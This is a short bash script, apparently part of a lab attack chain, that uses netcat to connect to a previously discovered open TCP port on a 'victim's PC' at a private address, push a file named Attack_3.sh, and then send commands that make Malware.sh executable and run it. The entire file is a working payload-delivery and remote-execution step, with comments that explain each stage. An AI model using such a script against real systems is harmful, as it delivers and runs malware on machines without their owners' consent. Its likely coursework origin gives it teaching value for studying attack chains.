#!/bin/bash
#This file is used to connect to the open tcp port previously found.
#The port is passed as argument 
#In case of successful connection it will send the file (Attack_3.sh) on the victim's PC and then execute it 
echo "Attempt on port tcp: $1" 
sudo nc 192.168.56.106 $1 -w 10 < Attack_3.sh 	#This command try to connect to the port passed as parameter and in case of success send the Attack_3.sh file, otherwise after 10 close the connection with fail.
sudo nc 192.168.56.106 $1 -w 10 << END 
chmod a+x Malware.sh				#this command gives the authorization to execute the files by all the users
./Malware.sh $1					#execute the file (malware) that could be an app and so on
END
